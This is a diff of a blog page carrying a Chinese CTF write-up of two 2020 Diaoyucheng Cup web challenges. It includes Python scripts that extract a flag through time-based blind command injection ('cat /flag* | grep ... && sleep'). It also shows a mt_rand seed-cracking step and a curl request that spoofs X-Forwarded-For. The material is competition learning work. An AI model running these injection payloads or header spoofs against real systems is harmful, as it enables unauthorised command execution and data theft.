@@ -22,12 +22,12 @@
   
   
   
-  <title>标签: CTF | iluem&#39;Blog</title>
+  <title>2020钓鱼城杯 Web Writeup | iluem&#39;Blog</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="Hexo, theme-bmw" />
+    <meta name="keywords" content="Web,CTF," />
   
 
   <script>
@@ -212,101 +212,324 @@
   })
 </script>
 
-      <div class="container">
-  <div class="timeline">
-  <span class="archive-move-on"></span>
-  <span class="archive-page-counter">
-    
-      <span>当前位于 1/1 页</span>
-    
-  </span>
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
   
+
+<div class="post">
+  <h1 class="article-title">
+    <span>2020钓鱼城杯 Web Writeup</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-08-27
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/Web/">
+            Web
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="passages2020钓鱼城杯 Web Writeup"></span>
+      </span>
+    
+  </div>
+
   
-    <div class="collection-title">
-      <h2>
-        
-          <span>标签 : CTF</span>
-        
-      </h2>
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="2020钓鱼城杯-Web-Writeup"><a href="#2020钓鱼城杯-Web-Writeup" class="headerlink" title="2020钓鱼城杯 Web Writeup"></a>2020钓鱼城杯 Web Writeup</h2><p>菜鸡只做了两题</p>
+<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>在header处可以看到<code>post cmd</code>，队友直接提示无回显命令执行不出网，然后搜到了一个脚本稍微改改</p>
+<pre><code class="python">import requests
+import re
+
+flag_format = re.compile(&#39;flag\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\}&#39;)
+all_letter = &#39;-}0123456789abcdefghijklmnopqrstuvwxyz&#39;
+
+
+def get_flag(command):
+    try:
+        r = requests.post(&#39;http://119.3.37.185/&#39;, data={&#39;cmd&#39;: command}, timeout=1.5)
+    except:
+        return True
+    return False
+
+
+if __name__ == &#39;__main__&#39;:
+    flag = &#39;flag{&#39;
+    while flag_format.match(flag) == None:
+        staus = 0
+        for i in all_letter:
+            payload = &#39;cat /flag* | grep %s &amp;&amp; sleep 1.8&#39; % (flag + i)
+            print(payload)
+            if get_flag(payload):
+                staus = 1
+                flag += i
+                print(flag)
+                break
+        if staus == 0:
+            flag = flag[0:-1]</code></pre>
+<p>学习一下Nu1L题解中的脚本</p>
+<pre><code class="python">import requests
+import string
+import time
+alphalist = &#39;}&#39; + string.ascii_letters + string.digits
+#print(alphalist)
+flag = &#39;flag{&#39;
+url = &#39;http://119.3.37.185/&#39;
+while flag[-1:] != &#39;}&#39;:
+    for tmp in alphalist:
+        payload = &quot;grep -e &#39;{}&#39; /flag.txt &amp;&amp; sleep 3&quot;.format(flag + tmp)
+        data = {&quot;cmd&quot;: payload}
+        try:
+            s = requests.post(url, data = data, timeout = 3)
+        except:
+            flag += tmp
+            print(flag)
+            break
+</code></pre>
+<h3 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a>easyseed</h3><p>发现题目index.bak中给的部分源码和</p>
+<p>php_mt_seed中给的一个例子几乎一样，题目的php回显是5.6。</p>
+<p><img src="https://i.loli.net/2020/08/31/DKoEknVsrC26Ywq.png" alt="Cache_-4e197d8c4187335e."></p>
+<p>修改一下得到如下脚本</p>
+<pre><code class="php">&lt;?php
+    $chars = &#39;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#39;; 
+    $pass = $argv[1];
+    $max = strlen($chars) - 1;
+    for($i = 0; $i &lt;  strlen($pass); $i++) {
+        $number = strpos($chars, $pass[$i]);
+        echo &quot;$number $number 0 $max  &quot;;
+    }
+    echo &quot;\n&quot;;</code></pre>
+<p>保存为<code>1.php</code>，运行</p>
+<pre><code>root@kali:~# php 1.php vEUHaY
+21 21 0 51  30 30 0 51  46 46 0 51  33 33 0 51  0 0 0 51  50 50 0 51</code></pre><p>然后使用<code>php_mt_seed</code></p>
+<p><img src="https://i.loli.net/2020/08/31/ArBP1p9KaEMdW4t.png" alt="Cache_ef653c52b0dc29d."></p>
+<p>在php在5.2~7.0之间一个版本</p>
+<p><img src="https://i.loli.net/2020/08/31/YDbvs6MX1yVNfGZ.png" alt="image-20200831101946179"></p>
+<pre><code>curl -vv 122.112.252.28:20001 --cookie &quot;lock=vEUHaY; key=nRtqGR8mtd9ZOPyI&quot; -H
+&quot;X-Forwarded-For: 127.0.0.1&quot;</code></pre>
     </div>
+  </div>
   
   
   
-  <article class="posts-collapse">
-    <header>
-      <h2>
-        <a href="/passages2020%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%20Web%20Writeup/">
-          <span>2020钓鱼城杯 Web Writeup</span>
-        </a>
-      </h2>
-      <div class="post-meta">
-        08-27
-      </div>
-    </header>
-  </article>
+
   
-  
-  <article class="posts-collapse">
-    <header>
-      <h2>
-        <a href="/passages2020%E5%BC%BA%E7%BD%91%E6%9D%AF/">
-          <span>强网杯 2020 Writeup</span>
-        </a>
-      </h2>
-      <div class="post-meta">
-        08-23
-      </div>
-    </header>
-  </article>
-  
-  
-  <article class="posts-collapse">
-    <header>
-      <h2>
-        <a href="/passages%E5%9B%BD%E8%B5%9B/">
-          <span>CISCN 2020 Web Writeup</span>
-        </a>
-      </h2>
-      <div class="post-meta">
-        08-21
-      </div>
-    </header>
-  </article>
-  
-  
-  <article class="posts-collapse">
-    <header>
-      <h2>
-        <a href="/passagesBUUCTF/">
-          <span>BUUCTF WriteUp</span>
-        </a>
-      </h2>
-      <div class="post-meta">
-        08-06
-      </div>
-    </header>
-  </article>
-  
-  
-  <article class="posts-collapse">
-    <header>
-      <h2>
-        <a href="/passagesXCTF-CyBRICS/">
-          <span>CyBRICS CTF 2020 Writeup</span>
-        </a>
-      </h2>
-      <div class="post-meta">
-        07-28
-      </div>
-    </header>
-  </article>
-  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/CTF/">
+              #CTF
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
 </div>
-  <nav class="page-navigation">
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
     
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/passages2020%E5%BC%BA%E7%BD%91%E6%9D%AF/" target="_self">强网杯 2020 Writeup</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/passagesGACTF%20%20Web%20Writeup/" target="_self">GACTF Web Writeup</a>
+        <i class="iconfont icon-next"></i>
+      </div>
     
   </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz",
+      appKey: "sivgWCRfGcA6BX905S8dIz1E",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz", "sivgWCRfGcA6BX905S8dIz1E");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
 </div>
+
 
       <footer>
   <p class="site-info">
